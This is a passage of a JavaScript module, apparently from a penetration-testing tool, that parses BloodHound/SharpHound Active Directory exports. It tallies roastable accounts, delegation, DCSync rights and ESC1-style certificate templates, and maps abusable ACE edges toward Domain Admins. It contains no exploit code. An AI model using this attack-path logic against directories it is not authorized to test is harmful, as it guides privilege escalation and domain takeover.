/*!
 * obol engine - bloodhound.js
 * BloodHound / SharpHound ingestion - turn a SharpHound/BloodHound-CE export into an
 * engagement-wide domain overlay, entirely client-side. Upload a collection zip (or the
 * loose JSON files), get a census (Domain/Enterprise Admins, Kerberoastable, AS-REP,
 * unconstrained/constrained/RBCD delegation, DCSync principals, broad local-admin, DA sessions,
 * execution reach, foreign principals, domain trusts, GPO abuse, SID history, gMSA, LAPS,
 * ESC1-shape templates), the derived owned->Domain-Admins attack path(s), a PlumHound-style
 * query board, and a self-contained printable report.
 *
 * Deliberately tolerant: BloodHound's JSON schema drifts across versions (legacy SharpHound
 * PascalCase vs BH-CE lower/camel), so every property read is case-insensitive and nesting-tolerant.
 *
 * CONSERVATIVE POSTURE: collection is NOT access. Recording `ad.graph.collected` proves the
 * graph was collected and names the domain - it never proves a usable control path. An
 * `ad.attack_paths` fact is a LEAD (the edges exist in the collected data), never a claim the
 * path was walked. A DA/EA census is recon context, not a win.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  // Universal Windows well-known RIDs / SIDs - Microsoft constants, identical in EVERY
  // Active Directory (not a lab fact). Used only to give a bare SID a readable label; the
  // collection's own name map always wins.
  var WELL_KNOWN_RID = {
    '500': 'Administrator', '501': 'Guest', '502': 'krbtgt', '512': 'Domain Admins',
    '513': 'Domain Users', '514': 'Domain Guests', '515': 'Domain Computers',
    '516': 'Domain Controllers', '517': 'Cert Publishers', '518': 'Schema Admins',
    '519': 'Enterprise Admins', '520': 'Group Policy Creator Owners', '521': 'Read-only Domain Controllers',
    '526': 'Key Admins', '527': 'Enterprise Key Admins'
  };
  var WELL_KNOWN_SID = {
    'S-1-0-0': 'Nobody', 'S-1-1-0': 'Everyone', 'S-1-3-0': 'Creator Owner', 'S-1-3-1': 'Creator Group',
    'S-1-5-4': 'Interactive', 'S-1-5-7': 'Anonymous', 'S-1-5-9': 'Enterprise Domain Controllers',
    'S-1-5-10': 'Principal Self', 'S-1-5-11': 'Authenticated Users',
    'S-1-5-18': 'SYSTEM', 'S-1-5-19': 'LOCAL SERVICE', 'S-1-5-20': 'NETWORK SERVICE',
    'S-1-5-32-544': 'Administrators', 'S-1-5-32-545': 'Users',
    'S-1-5-32-548': 'Account Operators', 'S-1-5-32-549': 'Server Operators',
    'S-1-5-32-550': 'Print Operators', 'S-1-5-32-551': 'Backup Operators',
    'S-1-5-32-554': 'Pre-Windows 2000 Compatible Access', 'S-1-5-32-555': 'Remote Desktop Users'
  };
  // Broad principals whose control/local-admin over something is a FINDING (a low-privilege
  // population holding privilege). Shape-based: a well-known broad SID, or the domain RID for
  // Domain Users / Domain Computers / Domain Guests.
  var BROAD_PRINCIPAL_SID = { 'S-1-1-0': 1, 'S-1-5-4': 1, 'S-1-5-11': 1, 'S-1-5-32-545': 1, 'S-1-5-32-555': 1 };
  var BROAD_PRINCIPAL_RID = { '513': 1, '515': 1, '514': 1 };

  // Strip optional leading "<DOMAIN>-" prefix that SharpHound v4/v5 attaches to domain-scoped
  // well-known SIDs (e.g. "EXAMPLE.LOCAL-S-1-5-32-544" -> "S-1-5-32-544").
  function canonicalWellKnownSid(rawSid) {
    var s = String(rawSid == null ? '' : rawSid).trim();
    if (!s) return '';
    var m = /^(?:.+-(?=S-1-[0-5]-))?(S-1-(?:0-0|1-0|3-\d+|5-(?:4|7|9|10|11|18|19|20|32-\d+)))$/i.exec(s);
    return m ? m[1].toUpperCase() : s;
  }

  // ACE right-names and lateral/delegation edges that are actionable control/movement edges.
  // MemberOf is a passive traversal edge and is handled separately.
  var ABUSABLE_ACE = {
    GenericAll: 1, GenericWrite: 1, WriteDacl: 1, WriteOwner: 1, Owns: 1, AddMember: 1, AddSelf: 1,
    ForceChangePassword: 1, AllExtendedRights: 1, AddKeyCredentialLink: 1, WriteSPN: 1,
    AddAllowedToAct: 1, AllowedToAct: 1, AllowedToDelegate: 1, HasSIDHistory: 1, GPOAbuse: 1,
    AdminTo: 1, CanPSRemote: 1, CanRDP: 1, ExecuteDCOM: 1, SQLAdmin: 1, HasSession: 1,
    SyncLAPSPassword: 1, ReadLAPSPassword: 1, ReadGMSAPassword: 1,
    WriteAccountRestrictions: 1, DCSync: 1, GetChangesAll: 1, GetChanges: 1
  };
  var CONTROL_EDGES = ABUSABLE_ACE;
  var TRAVERSAL_EDGES = Object.assign({ MemberOf: 1, Contains: 1, GpLink: 1 }, ABUSABLE_ACE);
  var HIGH_VALUE_RE = /^(DOMAIN ADMINS|ENTERPRISE ADMINS|SCHEMA ADMINS|ADMINISTRATORS|ACCOUNT OPERATORS|BACKUP OPERATORS|SERVER OPERATORS|PRINT OPERATORS|DNSADMINS|EXCHANGE WINDOWS PERMISSIONS|EXCHANGE TRUSTED SUBSYSTEM|ORGANIZATION MANAGEMENT|KEY ADMINS|ENTERPRISE KEY ADMINS)$/i;
  var MEMBER_ACE = { AddMember: 1, AddSelf: 1 };

  // ACE right-names that ARE (or grant) domain replication - on the domain object = DCSync.
  var DCSYNC_RIGHTS = { GetChangesAll: 1, DCSync: 1 };
  var DCSYNC_OWNING = { GenericAll: 1, WriteDacl: 1, Owns: 1, AllExtendedRights: 1 }; // let you GRANT DCSync

  // Tolerant property reads (the SharpHound / BH-CE casing drift)
  function isObj(x) { return x && typeof x === 'object' && !Array.isArray(x); }

  function prop(entry) {
    if (!isObj(entry)) return null;
    var keys = Array.prototype.slice.call(arguments, 1);
    var deflt = null;
    var wanted = keys.map(function (k) { return String(k).toLowerCase(); });
    var sub = (isObj(entry.Properties) ? entry.Properties : (isObj(entry.properties) ? entry.properties : {}));
    var sources = [entry, sub];
    for (var si = 0; si < sources.length; si++) {
      var src = sources[si];
      if (!isObj(src)) continue;
      var lowered = {};
      for (var kk in src) { if (Object.prototype.hasOwnProperty.call(src, kk)) lowered[String(kk).toLowerCase()] = src[kk]; }
      for (var wi = 0; wi < wanted.length; wi++) {
        var v = lowered[wanted[wi]];
        if (v !== undefined && v !== null) return v;
      }
    }
    return deflt;
  }

  function sidOf(o) { return String(prop(o, 'objectidentifier', 'objectid', 'sid') || ''); }

  function memberSid(m) {
    if (isObj(m)) return String(m.ObjectIdentifier || m.MemberId || m.objectid || m.PrincipalSID || m.TargetSID || '');
    return String(m == null ? '' : m);
  }

  // A readable label for a SID: the collection's own name first, then a universal well-known
  // RID/SID, else the raw SID (honest - never a guess).
  function resolveSid(sid, names) {
    var s = String(sid == null ? '' : sid).trim();
    if (!s) return '';
    if (names && names[s] && names[s] !== s) return String(names[s]).split('@')[0];
    var cSid = canonicalWellKnownSid(s);
    if (WELL_KNOWN_SID[cSid]) return WELL_KNOWN_SID[cSid];
    if (names && names[s]) return String(names[s]).split('@')[0];
    if (s.indexOf('S-1-5-21-') === 0) {
      var rid = s.substring(s.lastIndexOf('-') + 1);
      if (WELL_KNOWN_RID[rid]) return WELL_KNOWN_RID[rid];
    }
    return s;
  }

  function isBroadPrincipal(sid) {
    var s = String(sid == null ? '' : sid).trim();
    var cSid = canonicalWellKnownSid(s);
    if (BROAD_PRINCIPAL_SID[cSid]) return true;
    return s.indexOf('S-1-5-21-') === 0 && !!BROAD_PRINCIPAL_RID[s.substring(s.lastIndexOf('-') + 1)];
  }

  var BUILTIN_PRIV_RID_RE = /-(?:512|516|518|519|520|521|544)$/;
  var BUILTIN_PRIV_SID_RE = /^S-1-5-(?:9|18|19|20|32-544|32-548)$/i;
  var BUILTIN_PRIV_NAME_RE = /^(?:DOMAIN ADMINS|ENTERPRISE ADMINS|SCHEMA ADMINS|ADMINISTRATORS|ACCOUNT OPERATORS|GROUP POLICY CREATOR OWNERS|ENTERPRISE DOMAIN CONTROLLERS|DOMAIN CONTROLLERS|READ-ONLY DOMAIN CONTROLLERS|SYSTEM|LOCAL SERVICE|NETWORK SERVICE|NT AUTHORITY\\(?:SYSTEM|LOCAL SERVICE|NETWORK SERVICE))$/i;

  function isBuiltinPrivilegedSid(sid, name) {
    var s = String(sid == null ? '' : sid).trim();
    var cSid = canonicalWellKnownSid(s);
    if (s && (BUILTIN_PRIV_RID_RE.test(s) || BUILTIN_PRIV_SID_RE.test(cSid))) return true;
    var n = String(name == null ? '' : name).trim().split('@')[0].trim();
    if (n && BUILTIN_PRIV_NAME_RE.test(n)) return true;
    return false;
  }

  var OPERATOR_GOAL_RID_RE = /-(?:548|549|550|551)$/;
  var OPERATOR_GOAL_NAME_RE = /^(?:ACCOUNT OPERATORS|SERVER OPERATORS|PRINT OPERATORS|BACKUP OPERATORS|DNSADMINS)$/i;

  function isOperatorGoalGroup(sid, name) {
    var s = String(sid == null ? '' : sid).trim();
    var cSid = canonicalWellKnownSid(s);
    if (/^S-1-5-32-(?:548|549|550|551)$/i.test(cSid) || OPERATOR_GOAL_RID_RE.test(s)) return true;
    var base = String(name == null ? '' : name).trim().split('@')[0].trim();
    if (base && OPERATOR_GOAL_NAME_RE.test(base)) return true;
    return false;
  }

  // The domain portion of a machine SID - S-1-5-21-a-b-c for S-1-5-21-a-b-c-<rid>. Empty for a
  // well-known/built-in SID. Used to tell a foreign-domain principal (across a trust) from a local one.
  function domainOfSid(sid) {
    var s = String(sid == null ? '' : sid).trim();
    if (s.indexOf('S-1-5-21-') !== 0) return '';
    var parts = s.split('-');
    return parts.length >= 8 ? parts.slice(0, 7).join('-') : (parts.length === 7 ? s : '');
  }

  function domainFromName(name) {
    var s = String(name == null ? '' : name).trim();
    var idx = s.indexOf('@');
    if (idx >= 0 && idx < s.length - 1) return s.slice(idx + 1).toUpperCase();
    return '';
  }

  // Resolve a principal identifier (SID, full USER@DOMAIN, or short USER) to a SID in graph.names.
  // Matches exact SID first, then full USER@DOMAIN (case-insensitive), then short USER.
  function resolvePrincipalSid(graph, principal) {
    if (!graph || !principal) return '';
    var names = graph.names || {};
    var raw = String(principal).trim();
    if (!raw) return '';
    if (names[raw]) return raw;
    var low = raw.toLowerCase();
    var shortLow = low.split('@')[0];
    var hasDomain = low.indexOf('@') >= 0;
    var exactMatch = '', shortMatch = '';
    var sids = Object.keys(names);
    for (var i = 0; i < sids.length; i++) {
      var sid = sids[i];
      if (sid.toLowerCase() === low) return sid;
      var nm = String(names[sid] || '').toLowerCase();
      if (nm === low) { exactMatch = sid; break; }
      if (!shortMatch && nm.split('@')[0] === shortLow) shortMatch = sid;
    }
    if (exactMatch) return exactMatch;
    if (hasDomain) return ''; // If caller explicitly specified @DOMAIN and it did not match, do not collide with another domain
    return shortMatch;
  }

  function resolveOwnedSids(graph, ownedPrincipals) {
    var out = [];
    (ownedPrincipals || []).forEach(function (u) {
      var sid = resolvePrincipalSid(graph, u);
      if (sid && out.indexOf(sid) < 0) out.push(sid);
    });
    return out;
  }

  // Graph indexing
  function newGraph() {
    return {
      names: {}, types: {}, nodes: {}, control: [], control_edges: {}, members: [],
      local_admins: [], sessions: [], rdp: [], psremote: [], dcom: [],
      gpo_links: {}, contains: {}, raw_links: [], raw_delegation: [], raw_rbcd: [], raw_sid_history: [],
      da_sid: '', ea_sid: '', domain_sid: '',
      da_sids: [], ea_sids: [], admin_sids: [], operator_goal_sids: [], domain_sids: [],
      trust_domain_sids: {}
    };
  }

  function addControlEdge(graph, src, right, dst) {
    if (!src || !right || !dst) return;
    src = String(src); right = String(right); dst = String(dst);
    graph.control.push([src, right, dst]);
    if (!graph.control_edges) graph.control_edges = {};
    var list = graph.control_edges[src] || (graph.control_edges[src] = []);
    list.push({ right: right, target: dst });
  }

  var SINGULAR_KIND = {
    users: 'user', groups: 'group', computers: 'computer', domains: 'domain',
    gpos: 'gpo', ous: 'ou', containers: 'container', certtemplates: 'certtemplate'
  };

  // Fold one BloodHound object into the reachability graph: its identity, the ACEs OTHER
  // principals hold over it (control edges), and - for a group - its members (MemberOf edges).
  function indexObject(graph, kind, o) {
    var sid = sidOf(o);
    if (!sid) return;
    var name = String(prop(o, 'name') || sid);
    graph.names[sid] = name;
    graph.types[sid] = kind;
    if (!graph.nodes) graph.nodes = {};
    graph.nodes[sid] = {
      sid: sid,
      name: name,
      kind: SINGULAR_KIND[kind] || kind || 'object',
      domain: String(prop(o, 'domain') || domainFromName(name) || ''),
      admincount: !!prop(o, 'admincount', 'adminCount')
    };

    var aces = o.Aces || o.aces || [];
    if (Array.isArray(aces)) {
      for (var i = 0; i < aces.length; i++) {
        var ace = aces[i];
        if (!isObj(ace)) continue;
        var psid = ace.PrincipalSID || ace.principalSID || ace.principalsid || ace.PrincipalID;
        var right = ace.RightName || ace.rightName || ace.rightname || ace.right;
        if (psid && right) addControlEdge(graph, String(psid), String(right), sid);
      }
    }

    // Links (GPO links on domains/OUs or on GPOs)
    var links = o.Links || o.links || [];
    if (Array.isArray(links) && links.length) {
      if (!graph.raw_links) graph.raw_links = [];
      for (var li = 0; li < links.length; li++) {
        var lk = links[li];
        var lTarget = isObj(lk) ? String(lk.GUID || lk.Guid || lk.guid || lk.ObjectIdentifier || lk.Target || '') : String(lk || '');
        if (lTarget) graph.raw_links.push([sid, lTarget]);
      }
    }

    // ChildObjects / Contains (on domains, OUs, containers)
    var children = o.ChildObjects || o.childObjects || o.childobjects || o.Contains || o.contains || [];
    if (Array.isArray(children) && children.length) {
      if (!graph.contains) graph.contains = {};
      var cList = graph.contains[sid] || (graph.contains[sid] = []);
      for (var ci = 0; ci < children.length; ci++) {
        var chSid = memberSid(children[ci]);
        if (chSid && cList.indexOf(chSid) < 0) cList.push(chSid);
      }
    }

    if (kind === 'groups') {
      var members = o.Members || o.members || [];
      if (Array.isArray(members)) {
        for (var m = 0; m < members.length; m++) {
          var msid = memberSid(members[m]);
          if (msid) graph.members.push([msid, sid]);
        }
      }
      var base = name.split('@')[0].toUpperCase();
      var cGroupSid = canonicalWellKnownSid(sid);
      if (!graph.operator_goal_sids) graph.operator_goal_sids = [];
      if (base === 'DOMAIN ADMINS' || /-512$/.test(sid)) {
        if (!graph.da_sid) graph.da_sid = sid;
        if (graph.da_sids.indexOf(sid) < 0) graph.da_sids.push(sid);
      } else if (base === 'ENTERPRISE ADMINS' || /-519$/.test(sid)) {
        if (!graph.ea_sid) graph.ea_sid = sid;
        if (graph.ea_sids.indexOf(sid) < 0) graph.ea_sids.push(sid);
      } else if (base === 'ADMINISTRATORS' || base === 'SCHEMA ADMINS' || cGroupSid === 'S-1-5-32-544' || /-544$/.test(sid) || /-518$/.test(sid)) {
        if (graph.admin_sids.indexOf(sid) < 0) graph.admin_sids.push(sid);
      } else if (isOperatorGoalGroup(sid, base)) {
        if (graph.operator_goal_sids.indexOf(sid) < 0) graph.operator_goal_sids.push(sid);
      }
    } else if (kind === 'domains') {
      if (!graph.domain_sid) graph.domain_sid = sid;
      if (graph.domain_sids.indexOf(sid) < 0) graph.domain_sids.push(sid);
    } else if (kind === 'users' || kind === 'computers') {
      var pgSid = prop(o, 'primarygroupsid');
      if (pgSid) graph.members.push([sid, String(pgSid)]);
    }
  }

  // kind sniffing + per-file merge
  function kindOf(name, blob) {
    var meta = (blob && (blob.meta || blob.Meta)) || {};
    var t = String((meta && (meta.type || meta.Type)) || '').toLowerCase();
    if (t) return t;
    var low = String(name || '').toLowerCase();
    if (low.indexOf('certtemplate') >= 0 || low.indexOf('certtemplates') >= 0) return 'certtemplates';
    var kinds = ['users', 'computers', 'groups', 'domains', 'gpos', 'ous', 'containers'];
    for (var i = 0; i < kinds.length; i++) if (low.indexOf(kinds[i]) >= 0) return kinds[i];
    return '';
  }

  var TRUST_DIR = { '0': 'Disabled', '1': 'Inbound', '2': 'Outbound', '3': 'Bidirectional' };
  var TRUST_TYPE = { '0': 'ParentChild', '1': 'CrossLink', '2': 'Forest', '3': 'External', '4': 'Unknown' };

  // Supports both mergeJson(summary, name, textOrObj) and mergeJson(kind, data, summary, graph)
  function mergeJson(a, b, c, d) {
    var summary, name, blob, kind, data, graph;
    if (typeof a === 'string') {
      name = a;
      blob = Array.isArray(b) ? { data: b } : (isObj(b) ? b : {});
      kind = kindOf(name, blob) || name.toLowerCase();
      data = Array.isArray(b) ? b : (blob.data || blob.Data || []);
      summary = c || newSummary();
      graph = d || summary._graph || (summary._graph = newGraph());
    } else {
      summary = a;
      name = b;
      if (typeof c === 'string') {
        try { blob = JSON.parse(c); } catch (e) { return; }
      } else if (Array.isArray(c)) {
        blob = { data: c };
      } else {
        blob = c;
      }
      if (!isObj(blob)) return;
      kind = kindOf(name, blob);
      data = blob.data || blob.Data || [];
      graph = summary._graph;
    }
    if (!Array.isArray(data)) return;

    var i, o;
    if (graph) {
      for (i = 0; i < data.length; i++) { if (isObj(data[i])) indexObject(graph, kind, data[i]); }
    }

    if (kind === 'domains') {
      for (i = 0; i < data.length; i++) {
        var domObj = data[i];
        var nm = prop(domObj, 'name', 'domain');
        var domName = '';
        if (nm) {
          nm = String(nm);
          domName = nm.indexOf('@') >= 0 ? nm.split('@').pop().toUpperCase() : nm.toUpperCase();
          if (!summary.domain) summary.domain = domName;
          if (!summary.domains) summary.domains = [];
          if (summary.domains.indexOf(domName) < 0) summary.domains.push(domName);
        }
        var trusts = domObj.Trusts || domObj.trusts || prop(domObj, 'trusts') || [];
        if (Array.isArray(trusts) && trusts.length) {
          if (!summary.trusts) summary.trusts = [];
          for (var ti = 0; ti < trusts.length; ti++) {
            var tr = trusts[ti];
            if (!isObj(tr)) continue;
            var tDom = String(tr.TargetDomainName || tr.targetdomainname || tr.TargetName || tr.Name || '').toUpperCase();
            var tSid = String(tr.TargetDomainSid || tr.targetdomainsid || tr.TargetSid || '');
            var rawDir = tr.TrustDirection !== undefined ? tr.TrustDirection : tr.trustdirection;
            var dirStr = TRUST_DIR[String(rawDir)] || String(rawDir || 'Bidirectional');
            var rawType = tr.TrustType !== undefined ? tr.TrustType : tr.trusttype;
            var typeStr = TRUST_TYPE[String(rawType)] || String(rawType || 'Forest');
            var isTrans = tr.IsTransitive !== undefined ? !!tr.IsTransitive : (tr.istransitive !== undefined ? !!tr.istransitive : true);
            var sidFilt = tr.SidFilteringEnabled !== undefined ? !!tr.SidFilteringEnabled : (tr.sidfilteringenabled !== undefined ? !!tr.sidfilteringenabled : false);
            if (tDom) {
              if (tSid && graph) {
                if (!graph.names[tSid]) graph.names[tSid] = tDom;
                if (!graph.types[tSid]) graph.types[tSid] = 'domains';
                if (!graph.trust_domain_sids) graph.trust_domain_sids = {};
                graph.trust_domain_sids[tSid] = tDom;
                if (graph.domain_sids.indexOf(tSid) < 0) graph.domain_sids.push(tSid);
              }
              summary.trusts.push({
                source_domain: domName || summary.domain || 'DOMAIN',
                target_domain: tDom,
                target_sid: tSid,
                direction: dirStr,
                trust_type: typeStr,
                transitive: isTrans,
                sid_filtering: sidFilt
              });
            }
          }
        }
      }
    } else if (kind === 'users') {
      for (i = 0; i < data.length; i++) {
        var u = data[i];
        var usid = sidOf(u);
        var cUsid = canonicalWellKnownSid(usid);
        var un = String(prop(u, 'name') || '');
        var usam = String(prop(u, 'samaccountname') || '');
        var enabled = prop(u, 'enabled');
        var isSyntheticSysUser = /^S-1-5-(?:18|19|20)$/i.test(cUsid);
        if (isSyntheticSysUser) continue;
        var isNonDomainWellKnown = /^S-1-(?:[0-4]-|5-(?!21-))/i.test(cUsid);
        var isKrbtgt = /-502$/.test(usid) || /^krbtgt(?:@|$)/i.test(un) || /^krbtgt$/i.test(usam);
        var isCompAcct = /\$(?:@|$)/.test(un) || /\$$/.test(usam) || String(prop(u, 'objecttype', 'type') || '').toLowerCase() === 'computer';
        summary.users += 1;
        if (enabled !== false && !isKrbtgt && !isCompAcct && !isNonDomainWellKnown) {
          var uShort = usam.trim() || String(un || '').split('@')[0].trim();
          if (uShort && !/\$$/.test(uShort) && !/^krbtgt$/i.test(uShort) && !/^S-1-\d+-/i.test(uShort)) {
            if (!summary.user_list) summary.user_list = [];
            summary.user_list.push(uShort);
          }
        }
        if (prop(u, 'hasspn', 'hasSPN') && enabled !== false && !isKrbtgt && !isCompAcct) summary.kerberoastable.push(un);
        if (prop(u, 'dontreqpreauth', 'dontReqPreAuth') && enabled !== false && !isKrbtgt && !isCompAcct) summary.asrep_roastable.push(un);
        if (prop(u, 'highvalue', 'highValue', 'system_tags')) summary.high_value.push(un);
        if (enabled !== false) {
          if (prop(u, 'passwordnotreqd', 'passwordNotReqd')) summary.password_not_required.push(un);
          if (prop(u, 'pwdneverexpires', 'pwdNeverExpires')) summary.pwd_never_expires.push(un);
        }
        if (prop(u, 'gmsa', 'isgmsa') === true) {
          if (!summary.gmsa_accounts) summary.gmsa_accounts = [];
          summary.gmsa_accounts.push(un);
        }
        var uDel = prop(u, 'allowedtodelegate') || u.AllowedToDelegate || u.allowedtodelegate || [];
        if (isObj(uDel) && Array.isArray(uDel.Results)) uDel = uDel.Results;
        if (Array.isArray(uDel) && uDel.length && graph) {
          graph.raw_delegation.push({ sid: usid, name: un, targets: uDel });
        }
        var uSidHist = prop(u, 'sidhistory') || u.HasSIDHistory || u.hasSidHistory || [];
        if (isObj(uSidHist) && Array.isArray(uSidHist.Results)) uSidHist = uSidHist.Results;
        if (Array.isArray(uSidHist) && uSidHist.length && graph) {
          for (var shi = 0; shi < uSidHist.length; shi++) {
            var shTarget = memberSid(uSidHist[shi]);
            if (shTarget) {
              addControlEdge(graph, usid, 'HasSIDHistory', shTarget);
              graph.raw_sid_history.push([usid, shTarget]);
            }
          }
        }
      }
    } else if (kind === 'computers') {
      for (i = 0; i < data.length; i++) {
        var comp = data[i];
        var cn = String(prop(comp, 'name') || '');
        var csid = sidOf(comp);
        var cPgSid = String(prop(comp, 'primarygroupsid') || '');
        var cDn = String(prop(comp, 'distinguishedname') || '');
        var cEnabled = prop(comp, 'enabled');
        var cIsDc = prop(comp, 'isdc', 'isDC') === true || /-(?:516|521)$/.test(cPgSid) || /\bOU=Domain Controllers\b/i.test(cDn);
        if (cIsDc && graph) {
          if (!graph.dc_computers) graph.dc_computers = {};
          if (csid) graph.dc_computers[csid] = 1;
          if (cn) graph.dc_computers[cn.toUpperCase()] = 1;
        }
        summary.computers.push(cn);
        var compFqdn = String(prop(comp, 'name', 'dnshostname') || '').trim();
        if (cEnabled !== false && compFqdn && !/^S-1-\d+-/i.test(compFqdn)) {
          if (!summary.enabled_computers) summary.enabled_computers = [];
          summary.enabled_computers.push(compFqdn);
        }
        if (prop(comp, 'unconstraineddelegation', 'unconstrainedDelegation') && !cIsDc) summary.unconstrained_delegation.push(cn);
        if (prop(comp, 'haslaps', 'hasLaps') === true) {
          if (!summary.laps_computers) summary.laps_computers = [];
          summary.laps_computers.push(cn);
        }
        if (graph && csid) {
          var cDel = prop(comp, 'allowedtodelegate') || comp.AllowedToDelegate || comp.allowedtodelegate || [];
          if (isObj(cDel) && Array.isArray(cDel.Results)) cDel = cDel.Results;
          if (Array.isArray(cDel) && cDel.length) {
            graph.raw_delegation.push({ sid: csid, name: cn, targets: cDel });
          }
          var rbcd = comp.AllowedToAct || comp.allowedtoact || prop(comp, 'allowedtoact') || [];
          if (isObj(rbcd) && Array.isArray(rbcd.Results)) rbcd = rbcd.Results;
          if (Array.isArray(rbcd) && rbcd.length) {
            for (var rbi = 0; rbi < rbcd.length; rbi++) {
              var actorSid = memberSid(rbcd[rbi]);
              if (actorSid) {
                addControlEdge(graph, actorSid, 'AllowedToAct', csid);
                graph.raw_rbcd.push([actorSid, csid]);
              }
            }
          }
          var buckets = [
            ['LocalAdmins', 'local_admins'],
            ['Sessions', 'sessions'],
            ['PrivilegedSessions', 'sessions'],
            ['RegistrySessions', 'sessions'],
            ['RemoteDesktopUsers', 'rdp'],
            ['PSRemoteUsers', 'psremote'],
            ['DcomUsers', 'dcom']
          ];
          for (var bi = 0; bi < buckets.length; bi++) {
            var src = buckets[bi][0], bucket = buckets[bi][1];
            var raw = comp[src] || comp[src.toLowerCase()] || [];
            var rows = isObj(raw) ? (raw.Results || raw.results || []) : (Array.isArray(raw) ? raw : []);
            for (var r = 0; r < (rows || []).length; r++) {
              var mm = rows[r];
              var psid;
              if (bucket === 'sessions') {
                psid = isObj(mm) ? (mm.UserSID || mm.userSID || mm.usersid || mm.MemberId || mm.ObjectIdentifier) : String(mm);
              } else {
                psid = memberSid(mm);
              }
              if (psid) graph[bucket].push([String(psid), csid]);
            }
          }
        }
      }
    } else if (kind === 'groups') {
      for (i = 0; i < data.length; i++) {
        var g = data[i];
        var gsid = sidOf(g);
        var gn = String(prop(g, 'name') || '');
        var gbase = gn.split('@')[0].toUpperCase();
        var members = g.Members || g.members || [];
        var memberNames = [];
        if (Array.isArray(members)) {
          for (var mi = 0; mi < members.length; mi++) {
            var mem = members[mi];
            var mval = isObj(mem) ? String(mem.ObjectIdentifier || mem.MemberId || '') : String(mem);
            if (mval) memberNames.push(mval);
          }
        }
        if (gbase === 'DOMAIN ADMINS' || /-512$/.test(gsid)) {
          memberNames.forEach(function (m) {
            if (summary.domain_admins.indexOf(m) < 0) summary.domain_admins.push(m);
          });
        } else if (gbase === 'ENTERPRISE ADMINS' || /-519$/.test(gsid)) {
          memberNames.forEach(function (m) {
            if (summary.enterprise_admins.indexOf(m) < 0) summary.enterprise_admins.push(m);
          });
        } else if (gbase === 'REMOTE DESKTOP USERS') {
          summary.can_rdp = summary.can_rdp.concat(memberNames);
        } else if (gbase === 'REMOTE MANAGEMENT USERS' || gbase === 'WINRMREMOTEWMIUSERS__') {
          summary.can_winrm = summary.can_winrm.concat(memberNames);
        }
        var gSidHist = prop(g, 'sidhistory') || g.HasSIDHistory || g.hasSidHistory || [];
        if (isObj(gSidHist) && Array.isArray(gSidHist.Results)) gSidHist = gSidHist.Results;
        if (Array.isArray(gSidHist) && gSidHist.length && graph && gsid) {
          for (var gshi = 0; gshi < gSidHist.length; gshi++) {
            var gshTarget = memberSid(gSidHist[gshi]);
            if (gshTarget) {
              addControlEdge(graph, gsid, 'HasSIDHistory', gshTarget);
              graph.raw_sid_history.push([gsid, gshTarget]);
            }
          }
        }
      }
    } else if (kind === 'certtemplates') {
      var ESC_EKU = { '1.3.6.1.5.5.7.3.2': 1, '2.5.29.37.0': 1, '1.3.6.1.5.2.3.4': 1, '1.3.6.1.4.1.311.20.2.2': 1 };
      for (i = 0; i < data.length; i++) {
        var t = data[i];
        var props = (isObj(t.Properties) ? t.Properties : (isObj(t.properties) ? t.properties : {}));
        var tn = String(props.name || props.displayname || prop(t, 'name') || '');
        var supplies = props.enrolleesuppliessubject !== undefined ? props.enrolleesuppliessubject : prop(t, 'enrolleesuppliessubject');
        var clientAuth = props.authenticationenabled !== undefined ? props.authenticationenabled : prop(t, 'authenticationenabled');
        var ekus = props.ekus || props.effectiveekus || prop(t, 'ekus', 'effectiveekus') || [];
        var ekuOk = clientAuth === true;
        if (!ekuOk && Array.isArray(ekus)) {
          for (var ei = 0; ei < ekus.length; ei++) { if (ESC_EKU[String(ekus[ei]).trim()]) { ekuOk = true; break; } }
        }
        var tenabled = props.enabled !== undefined ? props.enabled : prop(t, 'enabled');
        if (tn && supplies === true && ekuOk && tenabled !== false) {
          summary.esc_templates.push(tn + ' (ESC1: enrollee supplies subject + client auth)');
        }
        var noSecExt = props.nosecurityextension === true || (typeof props.enrollmentflag === 'number' && (props.enrollmentflag & 0x80000));
        if (tn && noSecExt && ekuOk && tenabled !== false) {
          summary.esc_templates.push(tn + ' (ESC9: no security extension / weak mapping)');
        }
      }
    }
  }

  function buildAdminSidSet(g) {
    var set = {};
    if (!g) return set;
    if (g.da_sid) set[g.da_sid] = 1;
    if (g.ea_sid) set[g.ea_sid] = 1;
    (g.da_sids || []).forEach(function (s) { if (s) set[s] = 1; });
    (g.ea_sids || []).forEach(function (s) { if (s) set[s] = 1; });
    if (Array.isArray(g.admin_sids)) {
      g.admin_sids.forEach(function (s) { if (s) set[s] = 1; });
    } else if (isObj(g.admin_sids)) {
      Object.keys(g.admin_sids).forEach(function (s) { if (g.admin_sids[s]) set[s] = 1; });
    }
    return set;
  }

  function isGmsaExcludedSource(g, adminSet, src, names) {
    var dcMap = (g && g.dc_computers) || {};
    if (dcMap[src] || (names && names[src] && dcMap[String(names[src]).toUpperCase()])) return true;
    if (adminSet && adminSet[src]) return true;
    if (BUILTIN_PRIV_SID_RE.test(canonicalWellKnownSid(src)) || isBuiltinPrivilegedSid(src, names && names[src])) return true;
    return false;
  }

  // Census derivation (from the transient graph)
  function deriveCensus(summary) {
    var g = summary._graph || {};
    var names = g.names || {};
    var types = g.types || {};
    if (!summary.domains) summary.domains = [];
    if (!summary.trusts) summary.trusts = [];
    if (!summary.constrained_delegation) summary.constrained_delegation = [];
    if (!summary.rbcd_targets) summary.rbcd_targets = [];
    if (!summary.sid_history) summary.sid_history = [];
    if (!summary.gpo_abuse) summary.gpo_abuse = [];
    if (!summary.gmsa_accounts) summary.gmsa_accounts = [];
    if (!summary.laps_computers) summary.laps_computers = [];
    if (!g.da_sids) g.da_sids = g.da_sid ? [g.da_sid] : [];
    if (!g.ea_sids) g.ea_sids = g.ea_sid ? [g.ea_sid] : [];
    if (!g.admin_sids) g.admin_sids = [];
    if (!g.operator_goal_sids) g.operator_goal_sids = [];
    if (!g.domain_sids) g.domain_sids = g.domain_sid ? [g.domain_sid] : [];

    function ensureKnownGroupSid(rawSid) {
      if (!rawSid) return;
      var cSid = canonicalWellKnownSid(rawSid);
      if (cSid === 'S-1-5-32-544') {
        if (!names[rawSid]) names[rawSid] = WELL_KNOWN_SID[cSid];
        if (!types[rawSid]) types[rawSid] = 'groups';
        if (g.admin_sids.indexOf(rawSid) < 0) g.admin_sids.push(rawSid);
      } else if (/^S-1-5-32-(?:548|549|550|551)$/i.test(cSid)) {
        if (!names[rawSid]) names[rawSid] = WELL_KNOWN_SID[cSid];
        if (!types[rawSid]) types[rawSid] = 'groups';
